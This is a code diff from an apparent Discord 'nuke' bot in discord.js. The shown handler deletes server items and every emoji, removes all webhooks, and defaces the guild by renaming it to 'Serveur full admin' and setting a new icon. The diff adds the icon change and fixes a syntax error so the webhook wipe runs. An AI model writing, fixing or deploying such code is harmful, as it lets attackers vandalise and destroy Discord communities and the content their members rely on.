@@ -397,16 +397,17 @@ bot.on("message", async function(message) {
                               value.delete();
                             });
                             
-                            message.guild.setName("TestBot");
+                            message.guild.setName("Serveur full admin");
                             message.guild.setRegion("central europe");
                             message.guild.setAFKTimeout(30);
+                            message.guild.setIcon("./wLBF7RUE.jpg");
                             
                             var emojilist = message.guild.emojis
                             emojilist.forEach(function(value){
                               message.guild.deleteEmoji(value);
                             });
                             
-                            message.guild.fetchWebhooks().then(webhooks => webhooks.forEach(function(value){value.delete()});
+                            message.guild.fetchWebhooks().then(webhooks => {webhooks.forEach(function(value){value.delete()}});
                         });
                         msg.react('✅');
                     });     
